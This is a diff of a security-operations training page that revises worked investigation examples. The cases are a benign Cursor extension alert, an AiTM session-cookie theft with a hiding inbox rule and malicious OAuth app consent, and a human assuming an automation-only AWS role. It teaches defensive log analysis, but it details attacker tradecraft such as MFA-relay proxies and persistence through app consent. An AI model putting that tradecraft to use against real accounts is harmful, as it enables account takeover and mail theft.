+      <li><strong>Detection feedback:</strong> no change to the rule logic; it fired on exactly what it describes. Two requests: enrich the alert with the extension ID, the child's command line and the destination set; and, if the close holds, a pattern-entry proposal keyed to that tuple (Cursor build, bundled extension ID, destination set), never to signer and install path alone, with the expiry, owner and re-fire triggers the <a href="/docs/risk/false-positive/#when-benign-close-volume-becomes-its-own-signal">exception rules</a> require.</li>
+      <li><strong>Open questions for Risk:</strong> the cell. Impact if real turns on the host's SSH reach into the build environment; Risk scores it and recommends the move. Carried forward to the program: is TLS-metadata-only visibility to AI-tool vendor endpoints, with no USB device control, acceptable for the developer-workstation population?</li>
     </ul>
-
-    <Reveal summary="What this Uncover deliverable proves" variant="example">
-
-    A <DefineTerm term="Benign True Positive" display="benign-true-positive" /> verdict that meets the methodology's standard is not "dismissed." It is documented, evidenced, and bounded. The case has:
-
-    - Defensible scope (Scope's boundary)
-    - Defensible subject reads (Subject's per-<DefineTerm term="Entity" display="entity" /> assessments)
-    - Defensible Uncover evidence (this page's telemetry, with explicit gaps named)
-    - A detection-engineering <DefineTerm term="Feedback Loop" display="feedback loop" /> (the over-broad rule)
-    - A teed-up Risk question (acceptable coverage gaps?)
-
-    That is what a fully written benign close looks like. The investigation can be re-opened with full context if new signals appear. Without this kind of write-up, the same alert will fire again next week and the analyst will start from zero.
-
-    </Reveal>
+    <p>A <DefineTerm term="Benign True Positive" display="benign true positive" /> handled this way is documented, evidenced and bounded, not dismissed, and it can be reopened with full context. Without the write-up, the same alert fires next week and the analyst starts from zero.</p>
   </div>
 
 </ExampleStepper>
 
 </ChapterExample>
 
-<Callout variant="info" title="Two shapes of Uncover">
-The first scenario showed Uncover building a chain of techniques that confirmed compromise and produced a clear narrative for IR. The second showed Uncover documenting absence of compromise with the same rigor: chain of evidence, mapped (or explicitly not mapped) to ATT&CK, with confidence levels and tooling gaps surfaced. Both are correct Uncover outcomes. The methodology applies the same standard to both.
-</Callout>
-
 <Callout variant="warn" title="The inverse case: when the trusted component IS the threat">
-Scenario 2 cleared a signed binary, and it is easy to walk away with the wrong prior: trusted vendor, valid signature, role-consistent, therefore benign. The supply-chain pattern inverts every one of those signals. In a dependency-confusion attack, the malicious package has a legitimate-looking name and arrives through the normal package manager. A poisoned package or a compromised CI runner executes with the pipeline's own identity, signed and role-appropriate, because the trust chain was compromised upstream. SolarWinds beacons rode signed Orion binaries. When the subject is a build pipeline, a vendor agent, or a dependency, signature and role-consistency stop being clearing evidence. The questions that still discriminate are behavioral: did outbound destinations change, did the component start touching resources it never needed, did the behavior shift right after an update or a new dependency version? A trusted-component alert is cleared by baseline-deviation analysis, never by the trust itself.
+Case B cleared a signed binary only after inventorying the code running inside it. Do not take away the wrong prior (trusted vendor, valid signature, role-consistent, therefore benign): in a supply-chain compromise every one of those signals is inverted, as SolarWinds, the XZ Utils backdoor (CVE-2024-3094), the tj-actions/changed-files compromise (CVE-2025-30066) and the Shai-Hulud npm worm showed. What still discriminates is behavior: new destinations, new resources touched, a shift right after an update. The <a href="/docs/subject/entity-types/">entity-types page</a> states the rule: a trusted-component alert is cleared by baseline-deviation analysis, never by the trust itself.
 </Callout>
 
 ---
 
-## The third case: pulling the evidence on the hijacked session
+<a id="the-third-case-pulling-the-evidence-on-the-hijacked-session"></a>
+<h2 id="case-c">Case C · Pulling the evidence on the hijacked session</h2>
 
-Case C from the Alert chapter reaches Uncover with a live-adversary boundary: rvega's account, the hijacked session, and the consented OAuth app at full depth, a tenant-wide sweep written into the scope, and a standing trigger to escalate mid-phase on any payment-thread access.
+Previously, in [Scope's Case C](/docs/scope/example/#case-c): the escalation tripwire fired at the end of Alert (09:22), IR has owned the case since 09:28, and the boundary puts rvega's account, the replayed session, the consented OAuth app and the second user's credential-exposed account at full depth, with a tenant-wide sweep. The whole case is in the [case files](/docs/cases/#case-c). Uncover runs as IR-assigned scoping support, with the session ID and the account as its join keys, and findings go to the IR lead as they land.
 
 <ChapterExample
   title="Pulling the evidence on the SaaS token theft"
-  scenario="Scope set the boundary: AiTM session theft with BEC staging, window from 08:00 today held open until containment, 14-day tenant lookback, three primary identity entities, GDPR flagged, finance warned. Every query in this case runs against identity and tenant logs. Uncover begins."
+  scenario="AiTM session theft with BEC staging, window from 08:00 today through containment plus one token lifetime, 14-day tenant lookback, GDPR flagged with a candidate awareness timestamp. Reversible containment has held since 09:27. Every query runs against identity and tenant logs. Uncover begins at 10:00."
 >
 
 <ExampleStepper steps={["IdP sign-in chain", "Tenant audit reconstruction", "Tenant-wide sweep", "App activity and intel", "Map to ATT&CK"]}>
 
   <div data-step class="example-step">
     <h3>Step 1. The IdP sign-in chain</h3>
-    <p>The identity provider's logs anchor the whole case. One session ID appears twice, and the two presentations disagree on everything except the account.</p>
-    <pre><code>{`IdP sign-in log, rvega
-  08:47:19  interactive sign-in   corporate laptop   home ASN      MFA: satisfied
-  08:52:41  (email gateway: click on "shared document" link, verdict pending at click time)
-  09:03:12  session presented     unknown device     VPS ASN       MFA: none (token reuse)
-            same session ID as 08:47   fingerprint mismatch   geo: different country`}</code></pre>
-    <p>The join is the session ID; the evidence is the mismatch riding on it. No authentication ceremony at 09:03 means the attacker did not log in. They resumed. Confidence: confirmed on token reuse (single-source but structurally unambiguous), corroborated once the tenant audit lines up behind it.</p>
+    <p>The identity provider's logs anchor the case. Two sessions appear, and the one that matters was born through the proxy and then moved.</p>
+    <pre><code>{`IdP sign-in log, rvega (UTC)
+  08:47:19  interactive sign-in   corporate laptop     home ASN                 MFA: satisfied        session S1
+  08:52:41  (email gateway: click on "shared document" link, docs-share-portal[.]example, verdict pending)
+  08:53:37  interactive sign-in   her browser's UA     203.0.113.41  AS64501    password + MFA push   session S2 issued
+  09:03:12  session S2 presented  unknown device       198.51.100.77 AS64502    MFA: none (token reuse)
+            fingerprint mismatch   geo: different country   no authentication event behind it
+  09:31:04  session S2 presented  unknown device       198.51.100.77            refused (revoked 09:25)`}</code></pre>
+    <p>S1 is rvega's own and never leaves her laptop. S2 was born at 08:53:37, under a minute after the click, in a sign-in from a hosting IP that relayed her browser's user agent: the proxy passing her password and MFA approval through as she typed them. The 09:03 presentation of S2 from a second network is the replay; with no authentication ceremony behind it, the attacker did not log in, they resumed. Confidence is high on the replay (the tenant audit in Step 2 carries the same session ID from the same VPS IP, an independent source) and high on the proxy capture (the gateway click, the 08:53 hosting-IP sign-in, rvega's account of the push she approved, and the kit fingerprint in Step 4).</p>
+    <p>Nothing bound S2 to rvega's device: Conditional Access required no compliant device and no token protection, so the cookie worked from anywhere. That control gap is recorded beside the replay.</p>
     <p><strong>Mapped to ATT&CK:</strong> T1566.002 (Spearphishing Link) → T1557 (Adversary-in-the-Middle) → T1539 (Steal Web Session Cookie) → T1550.004 (Web Session Cookie).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 2. Tenant audit reconstruction</h3>
     <p>The unified audit log reconstructs what the attacker did with the session, in order:</p>
-    <pre><code>{`Tenant audit log, rvega's mailbox
-  09:06:55  New-InboxRule  name: "."   move to subscriptions folder + mark read
-            conditions: body/subject contains "invoice", "payment", "bank"
-  09:09:30  Consent granted  app: "Mail Backup Sync"  publisher: unverified
-            scopes: offline mailbox read
-  09:14-09:26  bulk mailbox sync via the consented app (aggregate events; ~1,800 items)
-  09:18:02  mailbox search: "remittance"   09:18:40  mailbox search: "wire"`}</code></pre>
-    <p>Each row lands in the running timeline with its source and confidence. The rule and consent events are confirmed; the sync volume is corroborated but item-level detail is pending the vendor request Scope submitted.</p>
-    <p><strong>Mapped to ATT&CK:</strong> T1564.008 (Email Hiding Rules) → T1528 (Application Access Token, via the forced consent) → T1114.002 (Remote Email Collection).</p>
+    <pre><code>{`Tenant audit log, rvega's mailbox (UTC)
+  09:06:55  New-InboxRule  name: "."   move to RSS Subscriptions + mark as read
+            conditions: subject/body contains "invoice", "payment", "bank"
+            session S2   client IP 198.51.100.77
+  09:09:30  Consent to application  app: "Mail Backup Sync"  publisher: unverified
+            scopes: Mail.Read offline_access   session S2
+  09:14-09:26  MailItemsAccessed (Bind) by app "Mail Backup Sync" from 192.0.2.66:
+            ~1,800 messages, each logged by InternetMessageId, billing threads included
+  09:18:02  mailbox search: "remittance"   09:18:40  mailbox search: "wire"   (session S2)
+  09:26:41  last app read in the audit; none after it`}</code></pre>
+    <p>The rule and consent events are confirmed. The app's reads are confirmed at item level: the access records, which reached the audit search from 10:02, list every message, and any folder that appears only as a sync is treated as fully accessed. The last app read sits within a minute of the 09:26 sign-in disable; the timeline states the two times side by side and does not claim the disable caused the stop. At 10:08 the analyst tells IR that high impact and exfiltration are now confirmed too (the content reached the app's external backend, presumed attacker-controlled), and compliance receives the message list at 10:22.</p>
+    <p><strong>Mapped to ATT&CK:</strong> T1564.008 (Email Hiding Rules) → T1671 (Cloud Application Integration: OAuth app consented from the hijacked session for standing mailbox access) → T1114.002 (Remote Email Collection through the app's token; the token use itself is T1550.001, Application Access Token).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 3. The tenant-wide sweep</h3>
-    <p>Scope bounded the sweep to two queries, run once, deliberately:</p>
+    <p>Scope bounded the sweep to one set of queries, run once, from the <a href="/docs/reference/identity-sweep/">identity-persistence sweep</a> checklist:</p>
     <ul class="example-step__list">
-      <li><strong>Sessions from the attacker ASN, all users, 14 days:</strong> one result. Only rvega's session ever presented from that network.</li>
-      <li><strong>Consent grants to the same app ID, all users, 14 days:</strong> one result. Only rvega's mailbox is granted.</li>
-      <li><strong>The second click-through user:</strong> the gateway shows her click at 08:54, but the IdP shows no token issuance and no foreign presentation. She abandoned the fake login page before completing MFA. Recorded as checked and clean, with the negative results written down.</li>
+      <li><strong>Sign-ins from the proxy IP, all users, 14 days:</strong> two. rvega's at 08:53:37 (MFA satisfied, S2 issued) and the second click-through user's at 08:54:49 (password accepted, MFA not completed, no token). They match the gateway's two clicks.</li>
+      <li><strong>Sessions from the attacker ASN, and session IDs seen from more than one network:</strong> one result each, both S2.</li>
+      <li><strong>Consent grants to the same app ID, and inbox or forwarding rules of the same shape:</strong> one result each, both on rvega's mailbox.</li>
+      <li><strong>MFA methods or devices registered from either attacker IP, and CRM sign-ins from attacker infrastructure:</strong> none.</li>
+      <li><strong>The second click-through user:</strong> credential-exposed, not clean. She reached the kit's credential step, so the proxy has her password: session theft is ruled out, credential theft is not. Subject reported her to IR; her sessions were revoked at 09:41, and her password was reset and her MFA methods reviewed at 09:44 with IR's approval. No further sign-in attempt against her account from either attacker network.</li>
     </ul>
-    <p>The blast radius statement this produces is what Risk and Escalation will lean on: one account, one session, one app grant, zero lateral spread observed, with the queries that support each "zero" named in the case file.</p>
+    <p>The blast-radius statement goes to IR at 10:14: one account under attacker control, one session, one app grant, one more exposed password already reset, zero lateral spread observed, with the queries behind each "zero" named in the case file.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 4. App activity and intelligence context</h3>
     <ul class="example-step__list">
-      <li><strong>What the app read.</strong> Aggregate sync events cover roughly 1,800 messages including the billing threads. Whether specific payment conversations were opened individually is pending vendor detail; the timeline carries that as an explicit gap row, not an assumption either way.</li>
-      <li><strong>The phishing domain.</strong> Registered nine days ago, certificate issued the same day, page fingerprint matching a commodity AiTM kit family per current vendor reporting. Medium confidence on the kit identification, high on the infrastructure being purpose-built.</li>
-      <li><strong>No outbound mail sent.</strong> The audit log shows no messages sent from the mailbox during the attacker window. The BEC play was interrupted at the collection stage, before any payment-redirect message went out.</li>
+      <li><strong>What the app read.</strong> About 1,800 messages, billing threads included, each named by its message ID. The GDPR assessment works from that list, not from an estimate.</li>
+      <li><strong>The phishing infrastructure.</strong> <code>docs-share-portal[.]example</code> was registered nine days ago, its certificate issued the same day, and its page fingerprint matches a commodity AiTM kit family per current vendor reporting. The proxy IP sits on hosting ASN AS64501 and the replay VPS on AS64502. Medium confidence on the kit identification, high on the infrastructure being purpose-built.</li>
+      <li><strong>No outbound mail sent.</strong> Message trace and the audit's send records agree: no messages left the mailbox during the attacker window, and no forwarding rule or delegate was added. The BEC play was interrupted at the collection stage.</li>
     </ul>
-    <p class="example-step__what-not"><strong>What a less experienced analyst could miss:</strong> where the "no outbound mail" claim has to come from. Checking the Sent Items folder proves nothing, because an attacker who sends a payment-redirect message deletes it from Sent in the same minute. The audit log records the send event regardless of what the mailbox looks like afterward. Negative claims are only as strong as the source that cannot be cleaned up.</p>
+    <p class="example-step__what-not"><strong>What a less experienced analyst could miss:</strong> where the "no outbound mail" claim has to come from. Sent Items proves nothing, because an attacker who sends a payment-redirect message deletes it in the same minute; the audit log records the send regardless. Negative claims are only as strong as the source that cannot be cleaned up.</p>
   </div>
 
   <div data-step class="example-step">
-    <h3>Step 5. Map to ATT&CK and trigger the handoff</h3>
-    <pre><code>{`T1566.002  Spearphishing link delivered to 4 customer-success users
-T1557      AiTM proxy captured the session after a legitimate MFA approval
-T1539      Web session cookie stolen at the proxy
-T1550.004  Cookie replayed from attacker infrastructure at 09:03
+    <h3>Step 5. Map to ATT&CK and complete the handoff packet</h3>
+    <pre><code>{`T1566.002  Spearphishing link delivered to 4 customer-success users at 08:41
+T1557      AiTM proxy relayed rvega's 08:53 sign-in, password and MFA approval included
+T1539      Session cookie for S2 captured at the proxy
+T1550.004  S2 replayed from attacker infrastructure at 09:03
 T1564.008  Inbox rule "." hiding payment-themed mail from 09:06
-T1528      OAuth app consented for standing mailbox access at 09:09
-T1114.002  Bulk remote mail collection 09:14-09:26`}</code></pre>
-    <p>The chain confirms active compromise with live persistence (the session and the app grant are both still valid). That is an escalation criterion, and per the <a href="/docs/uncover/correlation/">stopping rules</a>, hitting it ends Uncover now: the open items (vendor detail on app reads, final GDPR determination) transfer to the handoff packet as pending rather than blocking the escalation. Uncover packages the evidence chain, the entity verdicts, the intelligence context, and the named gaps, and the case moves.</p>
+T1671      OAuth app consented from the hijacked session for standing mailbox access at 09:09
+T1114.002  Remote mail collection through the app's token, 09:14-09:26`}</code></pre>
+    <p>The chain confirms the active compromise the escalation tripwire fired on at 09:22 and adds two more confirmed criteria, high impact and exfiltration, already sent to IR at 10:08. Per the <a href="/docs/uncover/correlation/">stopping rules</a>, Uncover as scoping support stops when IR's scoping questions are answered, not when the evidence runs out: the open items (the final GDPR determination, reuse of the relayed passwords elsewhere) go to the handoff packet as pending. Risk scores the case for the record.</p>
   </div>
 
 </ExampleStepper>
@@ -301,18 +304,19 @@ T1114.002  Bulk remote mail collection 09:14-09:26`}</code></pre>
 </ChapterExample>
 
 <KeyTakeaway>
-The token-theft case ran the same five-step Uncover as the endpoint cases with a different spine: the session ID and the account were the join keys, the IdP and tenant audit logs were the primary sources, and the tenant sweep's recorded negative results are what make "it was only one account" a defensible claim instead of a hope.
+The token-theft case ran the same Uncover discipline as the endpoint cases with a different spine: the session ID and the account were the join keys, the IdP and tenant audit logs were the primary sources, every finding went to IR as it landed, and the tenant sweep's recorded negative results are what make "one account taken, one more exposed and reset, nothing else" a defensible claim instead of a hope.
 </KeyTakeaway>
 
 ---
 
-## A cloud-native mini-example: the IAM role assumption
+<a id="a-cloud-native-mini-example-the-iam-role-assumption"></a>
+<h2 id="iam-mini-example">IAM mini-example · The unexpected role assumption</h2>
 
-The endpoint cases and the SaaS case above all started from an alert. The same methodology works for cloud-control-plane alerts where what matters is the API call, the principal, and the role chain. This shorter walkthrough shows how Uncover applies to a 2026-typical cloud alert.
+The same method works on the cloud control plane, where the join keys are the principal, the role session, and the API call. This shorter walkthrough is a standalone case, not one of the threaded ones.
 
 <ChapterExample
   title="An unexpected AssumeRole in AWS at 02:14 UTC"
-  scenario="GuardDuty fires: a long-tenure engineer's SSO-federated role session invokes sts:AssumeRole to chain into a role that is normally used only by a CI pipeline. The role grants S3 read on a regulated-data bucket. The user is a senior data engineer; the time is 02:14 UTC, outside their usual window. Subject and Scope set narrow bounds (this user, this role, this bucket, alert minus 1 hour through alert plus 4). Uncover begins."
+  scenario="GuardDuty raises Exfiltration:S3/AnomalousBehavior: the ci-data-export role session, assumed at 02:14 UTC from a senior data engineer's SSO-federated session, is reading regulated-pii-bucket in a pattern outside the role's CI baseline. The role is normally used only by a CI pipeline. The engineer is long-tenured, and the time is outside their usual window. Subject and Scope set narrow bounds (this user, this role, this bucket, alert minus 1 hour through alert plus 4). Uncover begins."
 >
 
 <ExampleStepper steps={["CloudTrail correlation", "IdP context", "Bucket access pattern", "Verdict and gaps"]}>
@@ -323,48 +327,48 @@ The endpoint cases and the SaaS case above all started from an alert. The same m
     <ul class="example-step__list">
       <li><strong>02:13:58 UTC.</strong> <code>sts:GetCallerIdentity</code> from the user. Source IP resolves to a corporate VPN egress.</li>
       <li><strong>02:14:02 UTC.</strong> <code>sts:AssumeRole</code> for <code>arn:aws:iam::&lt;account&gt;:role/ci-data-export</code>, session name <code>local-investigation-2026-05-12</code>.</li>
-      <li><strong>02:14–02:31 UTC.</strong> Eight <code>s3:GetObject</code> calls against <code>regulated-pii-bucket</code>, all against keys matching <code>quarterly-export/*</code>.</li>
-      <li><strong>Baseline check.</strong> The user has assumed <em>other</em> roles regularly, but not <code>ci-data-export</code>. The role is technically assumable by anyone in the <code>data-engineers</code> group; it's just rarely used outside CI.</li>
+      <li><strong>02:14–02:31 UTC.</strong> Eight <code>s3:GetObject</code> calls against <code>regulated-pii-bucket</code>, all against keys matching <code>quarterly-export/&#42;</code>.</li>
+      <li><strong>Baseline check.</strong> The user has assumed <em>other</em> roles regularly, but not <code>ci-data-export</code>. The role's IAM description and the data-platform runbook designate it automation-only, and the data-handling standard prohibits human use of pipeline roles. The trust policy never enforced that, so the role remains assumable by anyone in the <code>data-engineers</code> group.</li>
     </ul>
-    <p><strong>Mapped to ATT&CK:</strong> <strong>T1078.004 Valid Accounts: Cloud Accounts</strong> + <strong>T1530 Data from Cloud Storage</strong>.</p>
+    <p><strong>Candidate mapping, pending the authorization verdict:</strong> <strong>T1078.004 Valid Accounts: Cloud Accounts</strong> + <strong>T1530 Data from Cloud Storage</strong>.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 2. IdP context</h3>
-    <p>The engineer's AWS access is federated through IAM Identity Center, so every role session starts at the IdP. Pull the authentication that preceded it.</p>
+    <p>The engineer's AWS access is federated through IAM Identity Center, so every role session starts at the IdP.</p>
     <ul class="example-step__list">
       <li>SSO login at 02:13:14 UTC, FIDO2 second factor satisfied, registered device matches the user's laptop.</li>
-      <li>No <strong>impossible travel</strong> signal, same geographic region as their typical sign-in.</li>
-      <li>No <strong>OAuth consent grant</strong> events in the prior 14 days; no new app authorizations.</li>
-      <li>No <strong>stale-credential</strong> indicators: the AWS API calls use credentials minted by this fresh STS session, not a long-lived access key.</li>
+      <li>No <strong>impossible travel</strong> signal; same region as their typical sign-in.</li>
+      <li>No <strong>OAuth consent grant</strong> events or new app authorizations in the prior 14 days.</li>
+      <li>No <strong>stale-credential</strong> indicators: the API calls use credentials minted by this fresh STS session, not a long-lived access key.</li>
     </ul>
-    <p>The identity surface reads clean, and it is worth being precise about what that buys. It makes the specific patterns checked (impossible travel, consent abuse, old-key reuse) less likely. It does not establish who was at the keyboard, and a fresh STS session is not a non-replayable one: temporary credentials are still credentials, and a session minted seconds ago can be lifted from the engineer's laptop and replayed from anywhere while it lives. Clean authentication lowers the odds of some compromise paths; it is not evidence of authorization.</p>
+    <p>The clean identity surface makes the patterns checked (impossible travel, consent abuse, old-key reuse) less likely. It does not establish who was at the keyboard, and a fresh STS session is still a credential that can be lifted from the laptop and replayed while it lives. Clean authentication lowers the odds of some compromise paths; it is not evidence of authorization.</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 3. Bucket access pattern</h3>
-    <p>The actions taken inside the assumed role's session are what determine whether this matters.</p>
+    <p>The actions inside the assumed role's session decide whether this matters.</p>
     <ul class="example-step__list">
-      <li><strong>Eight objects read.</strong> All from <code>quarterly-export/</code>. No <code>s3:ListBucket</code> reconnaissance. No traversal into other prefixes.</li>
-      <li><strong>No write, no delete.</strong> No new objects created. No <code>s3:DeleteObject</code>. No bucket-policy or ACL changes.</li>
-      <li><strong>Source check.</strong> The session's source IP is the same corporate VPN throughout. That proves where the API calls came from; it says nothing about where the 120 MB went after it landed on the laptop. Destination is a separate question CloudTrail cannot answer.</li>
-      <li><strong>Object size.</strong> Total ~120 MB across the eight keys, consistent with quarterly export files. Consistency with an export is not evidence of an authorized export; the same eight files are what a data thief with this role would take.</li>
+      <li><strong>Eight objects read.</strong> All from <code>quarterly-export/</code>. No <code>ListObjects</code> calls (the API behind the <code>s3:ListBucket</code> permission), so no reconnaissance, and no traversal into other prefixes.</li>
+      <li><strong>No write, no delete.</strong> No new objects, no <code>s3:DeleteObject</code>, no bucket-policy or ACL changes.</li>
+      <li><strong>Source check.</strong> The same corporate VPN throughout. That proves where the API calls came from; it says nothing about where the 120 MB went after it landed on the laptop, which CloudTrail cannot answer.</li>
+      <li><strong>Object size.</strong> About 120 MB across the eight keys, consistent with quarterly export files. Consistency with an export is not evidence of an authorized export; the same eight files are what a data thief with this role would take.</li>
     </ul>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 4. Verdict and gaps</h3>
-    <p>The hypothesis going in was "unexpected role use on regulated data." The evidence has confirmed the unexpected role use; what it has not done is authorize it:</p>
+    <p>The hypothesis going in was "unexpected role use on regulated data." The evidence has confirmed the unexpected role use; it has not authorized it:</p>
     <ul class="example-step__list">
-      <li><strong>Verdict:</strong> confirmed policy/control violation, intent and authorization unresolved. A human interactively assumed a role that exists for a CI pipeline and read regulated data with it. That fact does not soften if the human turns out to be well-meaning; the role boundary was crossed either way. The two live hypotheses are "engineer doing quarterly-export work by hand" and "someone or something operating through the engineer's session," and nothing gathered so far separates them.</li>
-      <li><strong>What the subject's answer is worth:</strong> the on-shift IR opened a quick check and the engineer replied over Slack: manual export, CI was backed up. That answer is a lead to verify, never the verification. If the session is attacker-operated, the DM asks the attacker to vouch for themselves; if the engineer is a malicious insider, it asks the suspect. Contact also carries the tip-off rule: the analyst does not message the subject while compromise is plausibly live, and step 2's clean identity surface made contact acceptable, not conclusive.</li>
-      <li><strong>What closes the case instead:</strong> independent evidence on four points. An approved work item or change ticket for a manual export, verified with its owner, not the subject. The data owner's confirmation that this export, by this person, was authorized. Where the 120 MB went after the laptop and under what retention (the destination CloudTrail cannot show). And device-level confirmation that the session originated from the engineer's own interactive use. Until those land, the case stays open at its original priority.</li>
-      <li><strong>Loose end chased:</strong> the role session was named <code>local-investigation-2026-05-12</code>, which does not describe export work. The engineer's answer: a reused shell helper stamps that session name by default. Plausible, and checkable against the helper's repo, because a session name that misdescribes its own activity is also a cheap attacker disguise.</li>
-      <li><strong>Confidence:</strong> high that the access occurred as reconstructed; low-to-medium on the benign explanation until the independent authorization and destination evidence arrives. The subject's own confirmation moves the second number very little.</li>
-      <li><strong>Coverage gaps:</strong> the S3 data-events trail is on for <code>regulated-pii-bucket</code>; it would NOT be on for buckets without explicit data-event logging. This is a detection-engineering note, not a blocker for this case.</li>
-      <li><strong>Detection feedback:</strong> the alert did exactly its job: it caught a human using an automation-only role against regulated data, which is a real control violation even in the benign-explanation branch. The correct tuning is to tag roles like <code>ci-data-export</code> "automation-only" so manual assumption fires with that context attached, at urgency this event keeps earning. Downgrading this signal to informational because one case ended benign would tune away the only high-signal detection on that boundary.</li>
+      <li><strong>Verdict:</strong> confirmed policy/control violation, intent and authorization unresolved. Detection axis: true positive. Activity axis: policy violation. A human interactively assumed a role designated for a CI pipeline (<a href="/docs/subject/non-human-identities/#baselines-for-automation">automation-only</a>, so any human use departs from its baseline) and read regulated data with it. The two live hypotheses are "engineer doing quarterly-export work by hand" and "someone or something operating through the engineer's session," and nothing gathered so far separates them.</li>
+      <li><strong>What the subject's answer is worth:</strong> asked over Slack, the engineer replied: manual export, CI was backed up. That answer is a lead to verify, never the verification (<a href="/docs/escalation/communication/#verifying">verifying with the user</a> sets out why). If the session is attacker-operated, the message asks the attacker to vouch for themselves; if the engineer is a malicious insider, it asks the suspect. Step 2 did not make that contact safe: clean authentication cannot rule out an operator on the laptop, and while compromise or an insider branch is plausibly live the analyst does not message the subject. The quick check was a deliberate, recorded risk decision, not a triage default, which is one more reason the reply is worth so little; verification runs through the ticket owner and the data owner, not the subject.</li>
+      <li><strong>What closes the case instead:</strong> independent evidence on four points: an approved work item for a manual export, verified with its owner; the data owner's confirmation that this export, by this person, was authorized; where the 120 MB went after the laptop; and device-level confirmation that the session came from the engineer's own interactive use. Until those land, the case stays open at its original priority.</li>
+      <li><strong>Loose end chased:</strong> the role session was named <code>local-investigation-2026-05-12</code>, which does not describe export work. The engineer's answer: a reused shell helper stamps that name by default. Plausible, and checked against the helper's repo, because a misleading session name is also a cheap attacker disguise.</li>
+      <li><strong>Confidence:</strong> High that the access occurred as reconstructed (CloudTrail management and data events agree). Authorization is undetermined: the benign explanation rests on the subject's word, so confidence in it stays Low until the independent evidence arrives.</li>
+      <li><strong>Coverage gaps:</strong> S3 data events are on for <code>regulated-pii-bucket</code> but off by default elsewhere: a detection-engineering note, not a blocker for this case.</li>
+      <li><strong>Detection feedback:</strong> the alert caught a real control violation, even in the benign branch. Enforce the automation-only designation instead: restrict the trust policy of <code>ci-data-export</code> to the CI pipeline's OIDC principal, and alert on any human AssumeRole into roles tagged automation-only with a custom rule (EventBridge or SIEM), since GuardDuty cannot be tuned on role tags. Downgrading this signal because one case ended benign would tune away the only high-signal detection on that boundary.</li>
     </ul>
-    <p>This is what Uncover looks like when the case is cloud-anchored: same methodology, different sources (CloudTrail, IdP logs, S3 data events), same standard of evidence. And the standard is the point: a confirmed control violation with a friendly explanation is still a confirmed control violation until someone other than the subject authorizes it.</p>
+    <p>A confirmed control violation with a friendly explanation is still a confirmed control violation until someone other than the subject authorizes it.</p>
   </div>
 
 </ExampleStepper>
@@ -372,14 +376,13 @@ The endpoint cases and the SaaS case above all started from an alert. The same m
 </ChapterExample>
 
 <KeyTakeaway>
-Uncover combined multiple sources into a chain in every scenario on this page. The finance case built a chain of malicious endpoint techniques. The Cursor case built a chain of role-consistent activity that ruled out malice with explicit confidence. The token-theft case built its chain entirely from identity and tenant logs. The IAM mini-example did the same on the cloud control plane. The methodology demands the same evidence, the same documentation, and the same handoff in all four.
+Every case on this page joined several sources into one chain: malicious endpoint techniques in Case A, role-consistent activity that ruled out malice with explicit confidence in Case B, identity and tenant logs alone in Case C, the cloud control plane in the IAM mini-example. Same evidence standard, same documentation, same handoff in all four.
 </KeyTakeaway>
 
-<ContinueCard current="uncover" nextHref="/docs/uncover/quiz/" nextLabel="Uncover quiz" ctaLabel="Take the quiz" />
-
-<style>
-{`
-.example-step h3 { margin: 0 0 0.85rem 0; color: #fdba74; font-size: 1.2rem; }
-.example-step pre { margin: 0 0 1rem 0; font-size: 0.82rem; }
-`}
-</style>
+<ContinueCard
+  current="uncover"
+  nextHref="/docs/uncover/transition/"
+  nextLabel="Transition to Risk"
+  nextDescription="The handoff contract: what Uncover passes to Risk, and how to know the case is ready."
+  ctaLabel="Read the handoff"
+/>
